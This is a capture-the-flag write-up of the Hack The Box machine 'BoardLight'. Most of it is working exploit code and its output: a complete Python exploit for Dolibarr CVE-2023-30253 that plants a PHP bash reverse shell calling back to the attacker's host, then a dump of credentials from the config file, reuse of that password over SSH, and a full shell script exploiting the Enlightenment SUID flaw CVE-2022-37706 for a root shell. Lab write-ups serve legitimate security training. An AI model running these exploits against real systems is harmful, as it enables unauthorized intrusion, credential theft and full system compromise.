---
tags:
  - HTB
  - Hacking
  - Boot2Root
  - Linux
  - CVE-2023-30253
  - Dolibarr
  - CVE-2022-37706
  - Enlightment
---
# Overview

| Name        | BoardLight |
| ----------- | ---------- |
| OS          | Linux      |
| Base Points | Easy [20]  |
| Status      | Done       |
# Recon
## Nmap

```bash
$ sudo nmap -sC -sV -T4 10.129.231.37
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 06:04 CDT
Nmap scan report for 10.129.231.37
Host is up (0.079s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Site doesnt have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

![[boardlight.png]]

Change hostfile to just `board.htb`.
# Enumeration

```bash
$ ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --fw 6243

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 1784ms]
```

![[boardlight2.png]]

`admin:admin` worked.
# Initial Foothold

![[boardlight3.png]]

We had gotten version of Dolibarr and it is vulnerable.
## [CVE-2023-30253](https://github.com/nikn0laty/Exploit-for-Dolibarr-17.0.0-CVE-2023-30253?source=post_page-----b6f6264fc1f5---------------------------------------)

```bash
$ cat exploit.py 
#!/usr/bin/env python3

import requests
from bs4 import BeautifulSoup
import http.client
import time
import argparse
import uuid

auth_headers = {
    "Cache-Control": "max-age=0",
    "Upgrade-Insecure-Requests": "1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Accept-Encoding": "gzip, deflate, br",
    "Accept-Language": "en-US,en;q=0.9",
    "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
    "Connection": "close"
}

def remove_http_prefix(url: str) -> str:
    if url.startswith("http://"):
        return url[len("http://"):]
    elif url.startswith("https://"):
        return url[len("https://"):]
    else:
        return url

def get_csrf_token(url, headers):
    csrf_token = ""
    response = requests.get(url, headers=headers)

    if response.status_code == 200:
        soup = BeautifulSoup(response.content, "html.parser")
        meta_tag = soup.find("meta", attrs={"name": "anti-csrf-newtoken"})

        if meta_tag:
            csrf_token = meta_tag.get("content")
        else:
            print("[!] CSRF token not found")
    else:
        print("[!] Failed to retrieve the page. Status code:", response.status_code)

    return csrf_token

def auth(pre_login_token, username, password, auth_url, auth_headers):
    login_payload = {
        "token": pre_login_token,
        "actionlogin": "login",
        "loginfunction": "loginfunction",
        "backtopage": "",
        "tz": "-5",
        "tz_string": "America/New_York",
        "dst_observed": "1",
        "dst_first": "2024-03-10T01:59:00Z",
        "dst_second": "2024-11-3T01:59:00Z",
        "screenwidth": "1050",
        "screenheight": "965",
        "dol_hide_topmenu": "",
        "dol_hide_leftmenu": "",
        "dol_optimize_smallscreen": "",
        "dol_no_mouse_hover": "",
        "dol_use_jmobile": "",
        "username": username,
        "password": password
    }

    requests.post(auth_url, data=login_payload, headers=auth_headers, allow_redirects=True)
    
def create_site(hostname, login_token, site_name, http_connection):
    create_site_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryKouJvCUT1lX8IVE6",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_site_body = (
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addsite\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_REF\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "en\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_OTHERLANG\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"virtualhost\"\r\n\r\n"
        "http://" + site_name + ".localhost\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryKouJvCUT1lX8IVE6--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_site_body, create_site_headers)
    http_connection.getresponse()

def create_page(hostname, login_token, site_name, http_connection):
    create_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryur7X26L0cMS2mE5w",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    create_page_body = (
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "addcontainer\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageidbis\"\r\n\r\n"
        "-1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"radiocreatefrom\"\r\n\r\n"
        "checkboxcreatemanually\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TYPE_CONTAINER\"\r\n\r\n"
        "page\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"sample\"\r\n\r\n"
        "empty\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_TITLE\"\r\n\r\n"
        "TEST\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_PAGENAME\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_ALIASALT\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_DESCRIPTION\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_IMAGE\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_KEYWORDS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_LANG\"\r\n\r\n"
        "0\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"WEBSITE_AUTHORALIAS\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreation\"\r\n\r\n"
        "05/25/2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationday\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmonth\"\r\n\r\n"
        "05\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationyear\"\r\n\r\n"
        "2024\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationhour\"\r\n\r\n"
        "15\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationmin\"\r\n\r\n"
        "25\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"datecreationsec\"\r\n\r\n"
        "29\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_x\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader_y\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"htmlheader\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"addcontainer\"\r\n\r\n"
        "Create\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"externalurl\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimages\"\r\n\r\n"
        "1\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w\r\n"
        "Content-Disposition: form-data; name=\"grabimagesinto\"\r\n\r\n"
        "root\r\n"
        "------WebKitFormBoundaryur7X26L0cMS2mE5w--\r\n"
    )

    http_connection.request("POST", "/website/index.php", create_page_body, create_page_headers)
    http_connection.getresponse()

def edit_page(hostname, login_token, site_name, lhost, lport, http_connection):
    edit_page_headers = {
        "Host": remove_http_prefix(hostname),
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryYWePyybXc70N8CPm",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.6167.160 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cookie": "DOLSESSID_3dfbb778014aaf8a61e81abec91717e6f6438f92=aov9g1h2ao2quel82ijps1f4p7",
        "Connection": "close"
    }

    edit_page_body = (
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"token\"\r\n\r\n" +
        login_token + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"backtopage\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"dol_openinpopup\"\r\n\r\n\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"action\"\r\n\r\n"
        "updatesource\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"website\"\r\n\r\n" +
        site_name + "\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"pageid\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"update\"\r\n\r\n"
        "Save\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_x\"\r\n\r\n"
        "16\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT_y\"\r\n\r\n"
        "2\r\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm\r\n"
        "Content-Disposition: form-data; name=\"PAGE_CONTENT\"\r\n\r\n"
        "<!-- Enter here your HTML content. Add a section with an id tag and tag contenteditable=\"true\" if you want to use the inline editor for the content -->\n"
        "<section id=\"mysection1\" contenteditable=\"true\">\n"
        "    <?pHp system(\"bash -c 'bash -i >& /dev/tcp/" + lhost + "/" + lport + " 0>&1'\"); ?>\n"
        "</section>\n"
        "------WebKitFormBoundaryYWePyybXc70N8CPm--\r\n"
    )

    http_connection.request("POST", "/website/index.php", edit_page_body, edit_page_headers)
    http_connection.getresponse()

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="---[Reverse Shell Exploit for Dolibarr <= 17.0.0 (CVE-2023-30253)]---", usage= "python3 exploit.py <TARGET_HOSTNAME> <USERNAME> <PASSWORD> <LHOST> <LPORT>\r\nexample: python3 exploit.py http://example.com login password 127.0.0.1 9001")
    parser.add_argument("hostname", help="Target hostname")
    parser.add_argument("username", help="Username of Dolibarr ERP/CRM")
    parser.add_argument("password", help="Password of Dolibarr ERP/CRM")
    parser.add_argument("lhost", help="Listening host for reverse shell")
    parser.add_argument("lport", help="Listening port for reverse shell")

    args = parser.parse_args()
    min_required_args = 5
    if len(vars(args)) != min_required_args:
        parser.print_usage()
        exit()

    site_name = str(uuid.uuid4()).replace("-","")[:10]
    base_url = args.hostname + "/index.php"
    auth_url = args.hostname + "/index.php?mainmenu=home"
    admin_url = args.hostname + "/admin/index.php?mainmenu=home&leftmenu=setup&mesg=setupnotcomplete"
    call_reverse_shell_url = args.hostname + "/public/website/index.php?website=" + site_name + "&pageref=" + site_name

    pre_login_token = get_csrf_token(base_url, auth_headers)

    if pre_login_token == "":
        print("[!] Cannot get pre_login_token, please check the URL") 
        exit()

    print("[*] Trying authentication...")
    print("[**] Login: " + args.username)
    print("[**] Password: " + args.password)

    auth(pre_login_token, args.username, args.password, auth_url, auth_headers)
    time.sleep(1)

    login_token = get_csrf_token(admin_url, auth_headers)

    if login_token == "":
        print("[!] Cannot get login_token, please check the URL") 
        exit()

    http_connection = http.client.HTTPConnection(remove_http_prefix(args.hostname))

    print("[*] Trying created site...")
    create_site(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying created page...")
    create_page(args.hostname, login_token, site_name, http_connection)
    time.sleep(1)

    print("[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection")
    edit_page(args.hostname, login_token, site_name, args.lhost, args.lport, http_connection)

    http_connection.close()
    time.sleep(1)
    requests.get(call_reverse_shell_url)

    print("[!] If you have not received the shell, please check your login and password")
```

```bash
$ python3 exploit.py http://crm.board.htb admin admin 10.10.14.122 4444
[*] Trying authentication...
[**] Login: admin
[**] Password: admin
[*] Trying created site...
[*] Trying created page...
[*] Trying editing page and call reverse shell... Press Ctrl+C after successful connection
```

```bash
$ rlwrap nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.14.122] from (UNKNOWN) [10.129.231.37] 44764
bash: cannot set terminal process group (758): Inappropriate ioctl for device
bash: no job control in this shell
www-data@boardlight:~/html/crm.board.htb/htdocs/public/website$ 
```

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ cat conf.php
cat conf.php
<?php
//
// File generated by Dolibarr installer 17.0.0 on May 13, 2024
//
// Take a look at conf.php.example file for an example of conf.php file
// and explanations for all possibles parameters.
//
$dolibarr_main_url_root='http://crm.board.htb';
$dolibarr_main_document_root='/var/www/html/crm.board.htb/htdocs';
$dolibarr_main_url_root_alt='/custom';
$dolibarr_main_document_root_alt='/var/www/html/crm.board.htb/htdocs/custom';
$dolibarr_main_data_root='/var/www/html/crm.board.htb/documents';
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
// Authentication settings
$dolibarr_main_authentication='dolibarr';

//$dolibarr_main_demo='autologin,autopass';
// Security settings
$dolibarr_main_prod='0';
$dolibarr_main_force_https='0';
$dolibarr_main_restrict_os_commands='mysqldump, mysql, pg_dump, pgrestore';
$dolibarr_nocsrfcheck='0';
$dolibarr_main_instance_unique_id='ef9a8f59524328e3c36894a9ff0562b5';
$dolibarr_mailing_limit_sendbyweb='0';
$dolibarr_mailing_limit_sendbycli='0';

//$dolibarr_lib_FPDF_PATH='';
//$dolibarr_lib_TCPDF_PATH='';
//$dolibarr_lib_FPDI_PATH='';
//$dolibarr_lib_TCPDI_PATH='';
//$dolibarr_lib_GEOIP_PATH='';
//$dolibarr_lib_NUSOAP_PATH='';
//$dolibarr_lib_ODTPHP_PATH='';
//$dolibarr_lib_ODTPHP_PATHTOPCLZIP='';
//$dolibarr_js_CKEDITOR='';
//$dolibarr_js_JQUERY='';
//$dolibarr_js_JQUERY_UI='';

//$dolibarr_font_DOL_DEFAULT_TTF='';
//$dolibarr_font_DOL_DEFAULT_TTF_BOLD='';
$dolibarr_main_distrib='standard';
www-data@boardlight:~/html/crm.board.htb/htdocs/conf$ ls /home
ls /home
larissa
```

We got password `serverfun2$2023!!` tried it in only user in the shell `larissa`.

```bash
$ ssh larissa@board.htb
The authenticity of host 'board.htb (10.129.231.37)' can't be established.
ED25519 key fingerprint is SHA256:xngtcDPqg6MrK72I6lSp/cKgP2kwzG6rx2rlahvu/v0.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'board.htb' (ED25519) to the list of known hosts.
larissa@board.htb's password: serverfun2$2023!!

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

larissa@boardlight:~$ cat user.txt
ff40c7c8c5211e150f643e442c8da664
```
# Privilege Escalation

Seeing the files with SUID bit set we get:

```bash
larissa@boardlight:~$ find / -perm -4000 -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
```

`/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys`

```bash
larissa@boardlight:~$ /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
larissa@boardlight:~$ file /usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c32a8a1b279ba209d1029c51435d64b86ca09b8b, for GNU/Linux 3.2.0, stripped
```

Found this:
## [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit)

We can copy its `exploit.sh`:

```bash
#!/bin/bash

echo "CVE-2022-37706"
echo "[*] Trying to find the vulnerable SUID file..."
echo "[*] This may take few seconds..."

file=$(find / -name enlightenment_sys -perm -4000 2>/dev/null | head -1)
if [[ -z ${file} ]]
then
	echo "[-] Couldn't find the vulnerable SUID file..."
	echo "[*] Enlightenment should be installed on your system."
	exit 1
fi

echo "[+] Vulnerable SUID binary found!"
echo "[+] Trying to pop a root shell!"
mkdir -p /tmp/net
mkdir -p "/dev/../tmp/;/tmp/exploit"

echo "/bin/sh" > /tmp/exploit
chmod a+x /tmp/exploit
echo "[+] Enjoy the root shell :)"
${file} /bin/mount -o noexec,nosuid,utf8,nodev,iocharset=utf8,utf8=0,utf8=1,uid=$(id -u), "/dev/../tmp/;/tmp/exploit" /tmp///net
```

```bash
larissa@boardlight:~$ ./exploit.sh 
CVE-2022-37706
[*] Trying to find the vulnerable SUID file...
[*] This may take few seconds...

[+] Vulnerable SUID binary found!
[+] Trying to pop a root shell!
[+] Enjoy the root shell :)
mount: /dev/../tmp/: can't find in /etc/fstab.
# cat /root/root.txt
a481623b0b2c0ac0ac3c39555af63a2d
```

---
